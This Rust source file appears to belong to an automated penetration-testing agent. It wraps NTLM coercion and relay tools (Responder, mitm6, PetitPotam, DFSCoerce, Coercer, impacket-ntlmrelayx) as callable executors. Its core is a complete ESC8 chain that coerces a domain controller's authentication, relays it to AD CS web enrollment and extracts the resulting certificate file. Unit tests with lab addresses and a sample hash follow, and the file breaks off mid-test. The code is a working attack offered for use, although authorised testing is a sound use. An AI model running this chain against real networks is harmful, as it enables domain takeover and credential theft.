//! NTLM coercion and relay tool executors.
//!
//! Each function takes a JSON `Value` of arguments and returns a `ToolOutput`
//! produced by running the corresponding CLI tool as a subprocess.

use std::io::Write;

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

#[cfg(not(test))]
use anyhow::Context;
#[cfg(not(test))]
use base64::Engine;
#[cfg(not(test))]
use std::path::{Path, PathBuf};
#[cfg(not(test))]
use std::process::Stdio;
#[cfg(not(test))]
use std::time::{Duration, Instant};
#[cfg(not(test))]
use tokio::process::{Child, Command as TokioCommand};
#[cfg(not(test))]
use tokio::time::sleep;

/// Start Responder on a network interface to capture NTLM hashes.
///
/// Optional args: `interface` (default "eth0"), `analyze_mode`
pub async fn start_responder(args: &Value) -> Result<ToolOutput> {
    let interface = optional_str(args, "interface").unwrap_or("eth0");
    let analyze_mode = optional_bool(args, "analyze_mode").unwrap_or(false);

    CommandBuilder::new("responder")
        .flag("-I", interface)
        .arg_if(analyze_mode, "-A")
        .timeout_secs(30)
        .execute()
        .await
}

/// Start mitm6 to perform IPv6 DNS takeover for NTLM relay.
///
/// Required args: `domain`
/// Optional args: `interface` (default "eth0")
pub async fn start_mitm6(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let interface = optional_str(args, "interface").unwrap_or("eth0");

    CommandBuilder::new("mitm6")
        .flag("-d", domain)
        .flag("-i", interface)
        .timeout_secs(30)
        .execute()
        .await
}

/// Coerce NTLM authentication from a target using all known protocols.
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn coercer(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("coercer")
        .arg("coerce")
        .flag("-t", target)
        .flag("-l", listener)
        .arg("--always-continue")
        .timeout_secs(120);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

/// Coerce NTLM authentication via MS-EFSR (PetitPotam).
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn petitpotam(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("coercer")
        .arg("coerce")
        .flag("-t", target)
        .flag("-l", listener)
        .args(["--filter-protocol-name", "MS-EFSR"])
        .arg("--always-continue")
        .timeout_secs(60);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

/// Coerce NTLM authentication via MS-DFSNM (DFSCoerce).
///
/// Required args: `target`, `listener`
/// Optional args: `username`, `password`, `domain`
pub async fn dfscoerce(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let listener = required_str(args, "listener")?;
    let username = optional_str(args, "username");
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");

    let mut cmd = CommandBuilder::new("dfscoerce")
        .arg(listener)
        .arg(target)
        .timeout_secs(60);

    if let Some(u) = username {
        cmd = cmd.flag("-u", u);
    }
    if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }
    if let Some(d) = domain {
        cmd = cmd.flag("-d", d);
    }

    cmd.execute().await
}

/// Relay captured NTLM authentication to LDAPS for delegation abuse.
///
/// Required args: `dc_ip`
/// Optional args: `delegate_access`
pub async fn ntlmrelayx_to_ldaps(args: &Value) -> Result<ToolOutput> {
    let dc_ip = required_str(args, "dc_ip")?;
    let delegate_access = optional_bool(args, "delegate_access").unwrap_or(false);

    let target_url = format!("ldaps://{dc_ip}");

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_url)
        .arg_if(delegate_access, "--delegate-access")
        .timeout_secs(120)
        .execute()
        .await
}

/// Relay captured NTLM authentication to AD CS web enrollment.
///
/// Required args: `ca_host`
/// Optional args: `template`
pub async fn ntlmrelayx_to_adcs(args: &Value) -> Result<ToolOutput> {
    let ca_host = required_str(args, "ca_host")?;
    let template = optional_str(args, "template");

    let target_url = format!("http://{ca_host}/certsrv/certfnsh.asp");

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_url)
        .arg("--adcs")
        .flag_opt("--template", template)
        .timeout_secs(120)
        .execute()
        .await
}

/// Relay captured NTLM authentication to SMB on a target.
///
/// Required args: `target_ip`
/// Optional args: `socks`, `interactive`
pub async fn ntlmrelayx_to_smb(args: &Value) -> Result<ToolOutput> {
    let target_ip = required_str(args, "target_ip")?;
    let socks = optional_bool(args, "socks").unwrap_or(false);
    let interactive = optional_bool(args, "interactive").unwrap_or(false);

    CommandBuilder::new("impacket-ntlmrelayx")
        .flag("-t", target_ip)
        .arg_if(socks, "-socks")
        .arg_if(interactive, "-i")
        .timeout_secs(120)
        .execute()
        .await
}

/// Parsed + validated args for [`relay_and_coerce`]. Pulled into a struct so
/// the validation logic can be unit-tested without spawning subprocesses.
#[derive(Debug, Clone, PartialEq, Eq)]
struct RelayCoerceConfig {
    ca_host: String,
    coerce_target: String,
    attacker_ip: String,
    coerce_user: Option<String>,
    coerce_domain: String,
    coerce_secret: Option<CoerceSecret>,
    template: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum CoerceSecret {
    Hash(String),
    Password(String),
}

fn parse_relay_coerce_args(args: &Value) -> Result<RelayCoerceConfig> {
    let ca_host = required_str(args, "ca_host")?;
    // Accept legacy `target_dc` as an alias for backwards compat with state
    // injected before the rename.
    let coerce_target = optional_str(args, "coerce_target")
        .or_else(|| optional_str(args, "target_dc"))
        .ok_or_else(|| {
            anyhow::anyhow!("relay_and_coerce: missing required argument 'coerce_target'")
        })?;
    let attacker_ip = required_str(args, "attacker_ip")?;
    let coerce_user = optional_str(args, "coerce_user").filter(|s| !s.is_empty());
    let coerce_domain = optional_str(args, "coerce_domain").unwrap_or("");
    let coerce_hash = optional_str(args, "coerce_hash").filter(|s| !s.is_empty());
    let coerce_password = optional_str(args, "coerce_password").filter(|s| !s.is_empty());
    let template = optional_str(args, "template").unwrap_or("DomainController");

    // Source ≠ target. Coercing the CA host itself triggers same-machine
    // NTLM loopback rejection at IIS. Conservative literal compare — callers
    // mixing hostname/IP across the two args still slip through, that's their
    // problem to keep distinct.
    if coerce_target == ca_host {
        anyhow::bail!(
            "relay_and_coerce: coerce_target ({coerce_target}) must differ from ca_host \
             ({ca_host}); same-machine NTLM loopback protection blocks relayed auth. \
             Coerce a different machine account (e.g. another DC) and relay it to this CA."
        );
    }

    if coerce_user.is_some() && coerce_hash.is_none() && coerce_password.is_none() {
        anyhow::bail!(
            "relay_and_coerce: coerce_user provided without coerce_hash or coerce_password"
        );
    }

    // Defensive newline check so a stray input can't smuggle a second arg
    // into a child process via env propagation. Single-quote no longer matters
    // (no shell), but keep newline reject — embedded newlines in a hash or
    // hostname are always wrong.
    for (name, val) in [
        ("ca_host", ca_host),
        ("coerce_target", coerce_target),
        ("attacker_ip", attacker_ip),
        ("coerce_user", coerce_user.unwrap_or("")),
        ("coerce_domain", coerce_domain),
        ("template", template),
    ] {
        if val.contains('\n') || val.contains('\'') {
            anyhow::bail!("{name} contains forbidden character (newline or single-quote)");
        }
    }

    let coerce_secret = if let Some(h) = coerce_hash {
        if h.contains('\n') || h.contains('\'') || h.contains(' ') {
            anyhow::bail!("coerce_hash contains forbidden character");
        }
        Some(CoerceSecret::Hash(h.to_string()))
    } else if let Some(p) = coerce_password {
        if p.contains('\n') || p.contains('\'') {
            anyhow::bail!("coerce_password contains forbidden character");
        }
        Some(CoerceSecret::Password(p.to_string()))
    } else {
        None
    };

    Ok(RelayCoerceConfig {
        ca_host: ca_host.to_string(),
        coerce_target: coerce_target.to_string(),
        attacker_ip: attacker_ip.to_string(),
        coerce_user: coerce_user.map(String::from),
        coerce_domain: coerce_domain.to_string(),
        coerce_secret,
        template: template.to_string(),
    })
}

/// Composite ESC8 relay+coerce. Starts ntlmrelayx targeting AD CS web
/// enrollment, coerces a chosen machine account over unauth PetitPotam →
/// authenticated DFSCoerce → MS-EFSR → MS-RPRN until the relay log shows a
/// cert capture, then decodes the base64 cert from the log and emits
/// deterministic `PFX_FILE=` / `RELAYED_USER=` markers for the parser.
///
/// Required args: `ca_host`, `coerce_target`, `attacker_ip`.
/// Optional args: `coerce_user`, `coerce_domain`, `coerce_hash` /
/// `coerce_password`, `template` (default "DomainController").
///
/// **Source ≠ target.** `coerce_target` MUST differ from `ca_host`. When CA
/// is co-located on the DC (common in lab AD), coercing the same host triggers
/// Microsoft's same-machine NTLM loopback protection and ADCS rejects the
/// relayed auth. Coerce a different DC or member instead — e.g. a child-DC
/// machine account relayed to the parent forest's CA.
///
/// Phase 1 always runs unauthenticated PetitPotam (works against unpatched
/// DCs without creds). Phase 2 runs authenticated DFSCoerce. Phase 3 runs
/// `coercer` for MS-EFSR / MS-RPRN. Phases 2/3 are skipped when no creds
/// are supplied.
pub async fn relay_and_coerce(args: &Value) -> Result<ToolOutput> {
    let cfg = parse_relay_coerce_args(args)?;

    // In tests, stop after validation. Spawning impacket-ntlmrelayx would
    // require the binary on $PATH and a working network — that's integration
    // territory, not unit-test territory.
    #[cfg(test)]
    {
        let _ = cfg;
        Ok(ToolOutput {
            stdout: String::from("test-mode: relay_and_coerce skipped subprocess execution"),
            stderr: String::new(),
            exit_code: Some(0),
            success: true,
        })
    }

    #[cfg(not(test))]
    {
        run_relay_and_coerce(cfg).await
    }
}

#[cfg(not(test))]
async fn run_relay_and_coerce(cfg: RelayCoerceConfig) -> Result<ToolOutput> {
    let tempdir = tempfile::Builder::new()
        .prefix("ares_relay_")
        .tempdir()
        .context("failed to create relay workdir")?;
    let workdir = tempdir.path().to_path_buf();
    let relay_log = workdir.join("relay.log");
    let coerce_log = workdir.join("coerce.log");

    // ntlmrelayx normally drops to an interactive REPL on stdin; if we leave
    // stdin closed it reads EOF and exits right after binding ports. Piping
    // stdin without writing or closing keeps it alive without a `tail -f`
    // hack.
    let target_url = format!("http://{}/certsrv/certfnsh.asp", cfg.ca_host);
    let relay_log_out = std::fs::File::create(&relay_log).context("create relay.log")?;
    let relay_log_err = relay_log_out.try_clone().context("dup relay.log fd")?;

    // ntlmrelayx writes captured PFXs (and BloodHound JSON) relative to its
    // own CWD. Pin it to the workdir so artifacts land where we can find them
    // (and not in the worker's `/`).
    let mut relay_child: Child = TokioCommand::new("impacket-ntlmrelayx")
        .arg("-t")
        .arg(&target_url)
        .arg("--adcs")
        .arg("--template")
        .arg(&cfg.template)
        .arg("-smb2support")
        .arg("--no-da")
        .arg("--no-acl")
        .arg("--no-validate-privs")
        .arg("--no-dump")
        .current_dir(&workdir)
        .stdin(Stdio::piped())
        .stdout(Stdio::from(relay_log_out))
        .stderr(Stdio::from(relay_log_err))
        .kill_on_drop(true)
        .spawn()
        .context("failed to spawn impacket-ntlmrelayx (is it installed?)")?;

    // Give it a moment to bind ports.
    sleep(Duration::from_secs(3)).await;
    if let Ok(Some(status)) = relay_child.try_wait() {
        let log = tokio::fs::read_to_string(&relay_log)
            .await
            .unwrap_or_default();
        return Ok(ToolOutput {
            stdout: format!("RELAY_BIND_FAILED\n{log}"),
            stderr: String::new(),
            exit_code: Some(status.code().unwrap_or(-1)),
            success: false,
        });
    }

    let relay_pid = relay_child.id().unwrap_or(0);
    let mut summary = format!("RELAY_PID={relay_pid}\n");
    let mut captured_via: Option<&'static str> = None;

    // --- Phase 1: unauthenticated PetitPotam ---
    // Distros differ: Kali ships `petitpotam` (symlink), pip ships
    // `impacket-petitpotam`. Try in order, log if both missing.
    summary.push_str("=== Phase 1: unauth PetitPotam ===\n");
    let petit_bin = ["petitpotam", "impacket-petitpotam"]
        .into_iter()
        .find(|b| which_binary(b))
        .unwrap_or("petitpotam");
    let mut p1 = TokioCommand::new(petit_bin);
    p1.arg(&cfg.attacker_ip)
        .arg(&cfg.coerce_target)
        .current_dir(&workdir)
        .stdin(Stdio::null());
    run_phase(&coerce_log, "Phase 1: unauth PetitPotam", &mut p1, 25).await;
    if poll_for_cert(&relay_log, Duration::from_secs(8)).await {
        captured_via = Some("unauth_petitpotam");
    }

    // --- Phase 2: authenticated DFSCoerce ---
    if captured_via.is_none() && cfg.coerce_user.is_some() {
        summary.push_str("=== Phase 2: authenticated DFSCoerce (MS-DFSNM) ===\n");
        let user = cfg.coerce_user.as_deref().unwrap();
        let mut cmd = TokioCommand::new("dfscoerce");
        cmd.arg("-u").arg(user).arg("-d").arg(&cfg.coerce_domain);
        apply_coerce_secret(&mut cmd, cfg.coerce_secret.as_ref());
        cmd.arg(&cfg.attacker_ip)
            .arg(&cfg.coerce_target)
            .current_dir(&workdir)
            .stdin(Stdio::null());
        run_phase(&coerce_log, "Phase 2: DFSCoerce", &mut cmd, 25).await;
        if poll_for_cert(&relay_log, Duration::from_secs(10)).await {
            captured_via = Some("MS-DFSNM");
        }
    }

    // --- Phase 3: coercer over MS-EFSR / MS-RPRN ---
    if captured_via.is_none() && cfg.coerce_user.is_some() {
        let user = cfg.coerce_user.as_deref().unwrap();
        for proto in ["MS-EFSR", "MS-RPRN"] {
            summary.push_str(&format!(
                "=== Phase 3: authenticated coerce via {proto} ===\n"
            ));
            let mut cmd = TokioCommand::new("coercer");
            cmd.arg("coerce")
                .arg("-u")
                .arg(user)
                .arg("-d")
                .arg(&cfg.coerce_domain)
                .arg("-t")
                .arg(&cfg.coerce_target)
                .arg("-l")
                .arg(&cfg.attacker_ip)
                .arg("--filter-protocol-name")
                .arg(proto)
                .arg("--auth-type")
                .arg("smb")
                .arg("--always-continue");
            apply_coerce_secret(&mut cmd, cfg.coerce_secret.as_ref());
            cmd.current_dir(&workdir).stdin(Stdio::null());
            run_phase(&coerce_log, &format!("Phase 3: {proto}"), &mut cmd, 25).await;
            if poll_for_cert(&relay_log, Duration::from_secs(8)).await {
                captured_via = Some(proto);
                break;
            }
        }
    }

    // Allow any in-flight ADCS request to finish writing the cert.
    if captured_via.is_some() {
        sleep(Duration::from_secs(5)).await;
    }

    // Tear down ntlmrelayx.
    let _ = relay_child.start_kill();
    let _ = tokio::time::timeout(Duration::from_secs(5), relay_child.wait()).await;

    // Extract cert from the relay log if captured. Two ntlmrelayx output
    // shapes need handling:
    //   1. `--adcs` (our path) — writes the PFX to disk and logs
    //      "Writing PKCS#12 certificate to ./<user>.pfx" + earlier
    //      "Authenticating connection from .../<USER>$@ip" lines.
    //   2. `--ldap` userCertificate — logs "Base64 certificate of user <USER>:"
    //      followed by the base64 blob on the next line. Kept as fallback.
    let mut pfx_path: Option<PathBuf> = None;
    let mut relayed_user: Option<String> = None;
    if captured_via.is_some() {
        let log = tokio::fs::read_to_string(&relay_log)
            .await
            .unwrap_or_default();

        if let Some(cap) = extract_pfx_capture_from_log(&log) {
            let bare = cap.pfx_basename.trim_start_matches("./");
            let candidate = workdir.join(bare);
            if tokio::fs::metadata(&candidate).await.is_ok() {
                pfx_path = Some(candidate);
                relayed_user = Some(cap.user);
            }
        }

        if pfx_path.is_none() {
            if let Some((user, b64)) = extract_cert_from_log(&log) {
                let pfx = workdir.join(format!("{user}.pfx"));
                let cleaned: String = b64.chars().filter(|c| !c.is_whitespace()).collect();
                if let Ok(bytes) = base64::engine::general_purpose::STANDARD.decode(&cleaned) {
                    if !bytes.is_empty() && tokio::fs::write(&pfx, &bytes).await.is_ok() {
                        pfx_path = Some(pfx);
                        relayed_user = Some(user);
                    }
                }
            }
        }
    }

    let mut stdout = summary;
    if let Some(via) = captured_via {
        stdout.push_str(&format!("CERT_CAPTURED_VIA={via}\n"));
    }
    if let (Some(p), Some(u)) = (pfx_path.as_ref(), relayed_user.as_ref()) {
        stdout.push_str(&format!("PFX_FILE={}\n", p.display()));
        stdout.push_str(&format!("RELAYED_USER={u}\n"));
    }
    stdout.push_str("=== RELAY LOG ===\n");
    stdout.push_str(
        &tokio::fs::read_to_string(&relay_log)
            .await
            .unwrap_or_default(),
    );
    stdout.push_str("=== COERCE LOG ===\n");
    stdout.push_str(
        &tokio::fs::read_to_string(&coerce_log)
            .await
            .unwrap_or_default(),
    );

    let success = pfx_path.is_some();

    // Persist workdir if we resolved a PFX OR if a cert was captured (so
    // operators can debug extraction failures without losing the artifact).
    if success || captured_via.is_some() {
        let _ = tempdir.keep();
    }

    Ok(ToolOutput {
        stdout,
        stderr: String::new(),
        exit_code: Some(if success { 0 } else { 1 }),
        success,
    })
}

#[cfg(not(test))]
fn apply_coerce_secret(cmd: &mut TokioCommand, secret: Option<&CoerceSecret>) {
    match secret {
        Some(CoerceSecret::Hash(h)) => {
            cmd.arg("-hashes").arg(format!(":{h}"));
        }
        Some(CoerceSecret::Password(p)) => {
            cmd.arg("-p").arg(p);
        }
        None => {}
    }
}

/// Resolve a phase's subprocess: spawn it with a timeout and append a header
/// + stdout + stderr (or a clear error line on spawn/timeout failure) into
///   `coerce_log`. Errors are explicit, never swallowed — missing binaries used
///   to silently no-op Phase 1.
#[cfg(not(test))]
async fn run_phase(log: &Path, header: &str, cmd: &mut TokioCommand, timeout_secs: u64) {
    let timeout = Duration::from_secs(timeout_secs);
    let result = tokio::time::timeout(timeout, cmd.output()).await;
    match result {
        Ok(Ok(out)) => append_output(log, header, &out).await,
        Ok(Err(e)) => append_error(log, header, &format!("spawn failed: {e}")).await,
        Err(_) => append_error(log, header, &format!("timed out after {timeout_secs}s")).await,
    }
}

/// `which`-style binary check. Avoids pulling in a crate dep just to probe
/// $PATH.
#[cfg(not(test))]
fn which_binary(name: &str) -> bool {
    let Some(path) = std::env::var_os("PATH") else {
        return false;
    };
    for dir in std::env::split_paths(&path) {
        if dir.join(name).is_file() {
            return true;
        }
    }
    false
}

#[cfg(not(test))]
async fn append_output(path: &Path, header: &str, output: &std::process::Output) {
    use tokio::io::AsyncWriteExt;
    if let Ok(mut f) = tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .await
    {
        let _ = f.write_all(b"=== ").await;
        let _ = f.write_all(header.as_bytes()).await;
        let _ = f.write_all(b" ===\n").await;
        let _ = f.write_all(&output.stdout).await;
        let _ = f.write_all(&output.stderr).await;
        let _ = f.write_all(b"\n").await;
    }
}

#[cfg(not(test))]
async fn append_error(path: &Path, header: &str, msg: &str) {
    use tokio::io::AsyncWriteExt;
    if let Ok(mut f) = tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .await
    {
        let _ = f.write_all(b"=== ").await;
        let _ = f.write_all(header.as_bytes()).await;
        let _ = f.write_all(b" ===\n[ERROR] ").await;
        let _ = f.write_all(msg.as_bytes()).await;
        let _ = f.write_all(b"\n").await;
    }
}

#[cfg(not(test))]
async fn poll_for_cert(relay_log: &Path, max: Duration) -> bool {
    let deadline = Instant::now() + max;
    while Instant::now() < deadline {
        if let Ok(s) = tokio::fs::read_to_string(relay_log).await {
            // `--adcs` writes "GOT CERTIFICATE! ID <n>" then "Writing PKCS#12 …".
            // `--ldap` userCertificate writes "Base64 certificate of user …".
            if s.contains("Base64 certificate of user")
                || s.contains("GOT CERTIFICATE!")
                || s.contains("Writing PKCS#12 certificate to")
            {
                return true;
            }
        }
        sleep(Duration::from_millis(500)).await;
    }
    false
}

/// Captured-cert metadata for the `--adcs` path: ntlmrelayx writes the PFX to
/// disk relative to its CWD and logs the path.
#[derive(Debug, Clone, PartialEq, Eq)]
struct PfxCapture {
    user: String,
    pfx_basename: String,
}

/// Walk the relay log, pair the most-recent authenticating-as-user line with
/// the most-recent "Writing PKCS#12 certificate to <path>" line. Returns None
/// if either marker is missing.
fn extract_pfx_capture_from_log(log: &str) -> Option<PfxCapture> {
    let mut last_user: Option<String> = None;
    let mut last_pfx: Option<String> = None;

    for line in log.lines() {
        // "[*] Authenticating against http://... as DOMAIN/USER$ SUCCEED"
        // "[*] SMBD-Thread-N: Connection from DOMAIN/USER$@ip controlled, attacking..."
        // Both shapes appear depending on flow; pull the user after the slash.
        if let Some(user) = parse_relayed_user(line) {
            last_user = Some(user);
        }
        // "[*] Writing PKCS#12 certificate to ./DC01.pfx"
        if let Some(idx) = line.find("Writing PKCS#12 certificate to ") {
            let after = &line[idx + "Writing PKCS#12 certificate to ".len()..];
            let path = after.split_whitespace().next().unwrap_or("");
            if !path.is_empty() {
                last_pfx = Some(path.to_string());
            }
        }
    }

    match (last_user, last_pfx) {
        (Some(u), Some(p)) => Some(PfxCapture {
            user: u,
            pfx_basename: p,
        }),
        // If we got a PFX path but no user, fall back to the file's basename
        // (ntlmrelayx names the PFX after the user).
        (None, Some(p)) => {
            let base = std::path::Path::new(p.trim_start_matches("./"))
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("relayed")
                .to_string();
            Some(PfxCapture {
                user: base,
                pfx_basename: p,
            })
        }
        _ => None,
    }
}

/// Pull a relayed username out of a line that looks like
/// "DOMAIN/USERNAME$@target" or "DOMAIN/USERNAME@target". Returns the bare
/// username including any trailing `$`.
fn parse_relayed_user(line: &str) -> Option<String> {
    let at_idx = line.find('@')?;
    let prefix = &line[..at_idx];
    // Walk backwards from '@' to the slash that splits domain/user.
    let user_start = prefix.rfind('/')? + 1;
    let candidate: &str = prefix[user_start..]
        .split_terminator(|c: char| c.is_whitespace())
        .next()?;
    if candidate.is_empty() {
        return None;
    }
    // Heuristic — usernames here are word chars + an optional trailing $.
    if !candidate
        .chars()
        .all(|c| c.is_alphanumeric() || c == '$' || c == '_' || c == '-' || c == '.')
    {
        return None;
    }
    Some(candidate.to_string())
}

/// Parse the relay.log for the LAST captured cert. ntlmrelayx prints
/// `Base64 certificate of user <NAME>` followed by the base64 blob on the
/// next non-empty line. Returns (user, base64_blob).
fn extract_cert_from_log(log: &str) -> Option<(String, String)> {
    let mut last_user: Option<String> = None;
    let mut last_b64: Option<String> = None;
    let mut pending_user: Option<String> = None;

    for line in log.lines() {
        if let Some(idx) = line.find("Base64 certificate of user ") {
            let after = &line[idx + "Base64 certificate of user ".len()..];
            let name = after
                .split_whitespace()
                .next()
                .unwrap_or("")
                .trim_end_matches(':');
            if !name.is_empty() {
                pending_user = Some(name.to_string());
            }
            continue;
        }
        if let Some(user) = &pending_user {
            let trimmed = line.trim();
            if !trimmed.is_empty() {
                last_user = Some(user.clone());
                last_b64 = Some(trimmed.to_string());
                pending_user = None;
            }
        }
    }

    match (last_user, last_b64) {
        (Some(u), Some(b)) => Some((u, b)),
        _ => None,
    }
}

/// Relay captured NTLM authentication to multiple targets.
///
/// Optional args: `targets_file`, `target_ips` (comma-separated), `dump_sam`
///
/// If `target_ips` is provided, writes them to a temp file and uses `-tf`.
/// Otherwise, `targets_file` is used directly with `-tf`.
pub async fn ntlmrelayx_multirelay(args: &Value) -> Result<ToolOutput> {
    let targets_file = optional_str(args, "targets_file");
    let target_ips = optional_str(args, "target_ips");
    let dump_sam = optional_bool(args, "dump_sam").unwrap_or(false);

    let mut cmd = CommandBuilder::new("impacket-ntlmrelayx").timeout_secs(120);

    // Hold the temp file in scope so it lives until execute() completes.
    let _tmp_file;

    if let Some(ips) = target_ips {
        // Write comma-separated IPs as newline-separated entries in a temp file.
        let mut tf = tempfile::NamedTempFile::new()?;
        for ip in ips.split(',') {
            writeln!(tf, "{}", ip.trim())?;
        }
        tf.flush()?;
        let path = tf.path().to_string_lossy().to_string();
        cmd = cmd.flag("-tf", path);
        _tmp_file = Some(tf);
    } else if let Some(tf_path) = targets_file {
        cmd = cmd.flag("-tf", tf_path);
        _tmp_file = None;
    } else {
        _tmp_file = None;
    }

    cmd = cmd.arg_if(dump_sam, "--dump-sam");

    cmd.execute().await
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::executor::mock;
    use serde_json::json;

    #[tokio::test]
    async fn start_responder_executes() {
        mock::push(mock::success());
        let args = json!({});
        assert!(start_responder(&args).await.is_ok());
    }

    #[tokio::test]
    async fn start_responder_analyze_mode() {
        mock::push(mock::success());
        let args = json!({"interface": "eth1", "analyze_mode": true});
        assert!(start_responder(&args).await.is_ok());
    }

    #[tokio::test]
    async fn start_mitm6_executes() {
        mock::push(mock::success());
        let args = json!({"domain": "contoso.local"});
        assert!(start_mitm6(&args).await.is_ok());
    }

    #[tokio::test]
    async fn coercer_executes() {
        mock::push(mock::success());
        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
        assert!(coercer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn coercer_with_creds_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "listener": "192.168.58.5",
            "username": "admin", "password": "P@ss", "domain": "contoso.local"
        });
        assert!(coercer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn petitpotam_executes() {
        mock::push(mock::success());
        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
        assert!(petitpotam(&args).await.is_ok());
    }

    #[tokio::test]
    async fn petitpotam_with_creds_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "listener": "192.168.58.5",
            "username": "admin", "password": "P@ss", "domain": "contoso.local"
        });
        assert!(petitpotam(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dfscoerce_executes() {
        mock::push(mock::success());
        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
        assert!(dfscoerce(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_ldaps_executes() {
        mock::push(mock::success());
        let args = json!({"dc_ip": "192.168.58.1"});
        assert!(ntlmrelayx_to_ldaps(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_ldaps_delegate_access() {
        mock::push(mock::success());
        let args = json!({"dc_ip": "192.168.58.1", "delegate_access": true});
        assert!(ntlmrelayx_to_ldaps(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_adcs_executes() {
        mock::push(mock::success());
        let args = json!({"ca_host": "ca01.contoso.local"});
        assert!(ntlmrelayx_to_adcs(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_adcs_with_template() {
        mock::push(mock::success());
        let args = json!({"ca_host": "ca01.contoso.local", "template": "User"});
        assert!(ntlmrelayx_to_adcs(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_smb_executes() {
        mock::push(mock::success());
        let args = json!({"target_ip": "192.168.58.1"});
        assert!(ntlmrelayx_to_smb(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_smb_with_socks() {
        mock::push(mock::success());
        let args = json!({"target_ip": "192.168.58.1", "socks": true, "interactive": true});
        assert!(ntlmrelayx_to_smb(&args).await.is_ok());
    }

    #[tokio::test]
    async fn relay_and_coerce_requires_secret() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_domain": "contoso.local"
        });
        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
        assert!(err.contains("coerce_hash") || err.contains("coerce_password"));
    }

    #[tokio::test]
    async fn relay_and_coerce_rejects_quote_in_inputs() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_domain": "contoso.local",
            "coerce_password": "p'ass"
        });
        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
        assert!(err.contains("forbidden"));
    }

    #[tokio::test]
    async fn relay_and_coerce_rejects_same_host() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.10",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
            "coerce_domain": "contoso.local"
        });
        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
        assert!(err.contains("must differ") || err.contains("loopback"));
    }

    #[tokio::test]
    async fn relay_and_coerce_accepts_legacy_target_dc_alias() {
        mock::push(mock::success());
        let args = json!({
            "ca_host": "192.168.58.10",
            "target_dc": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
            "coerce_domain": "contoso.local"
        });
        assert!(relay_and_coerce(&args).await.is_ok());
    }

    #[tokio::test]
    async fn relay_and_coerce_with_hash_executes() {
        mock::push(mock::success());
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
            "coerce_domain": "contoso.local"
        });
        assert!(relay_and_coerce(&args).await.is_ok());
    }

    #[tokio::test]
    async fn relay_and_coerce_unauth_executes() {
        mock::push(mock::success());
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100"
        });
        assert!(relay_and_coerce(&args).await.is_ok());
    }

    #[test]
    fn extract_cert_from_log_picks_last_capture() {
        // Two captures in one log; we want the last one.
        let log = "\
[*] Servers started, waiting for connections\n\
[*] SMBD-Thread-1: Received connection from x\n\
[*] Authenticating against http://ca/certsrv/ as DC1$\n\
[*] Base64 certificate of user DC1$:\n\
MIIBlahFirstCert==\n\
[*] Servers started, waiting for connections\n\
[*] Base64 certificate of user DC2$:\n\
MIIBlahSecondCert==\n\
[*] done\n";
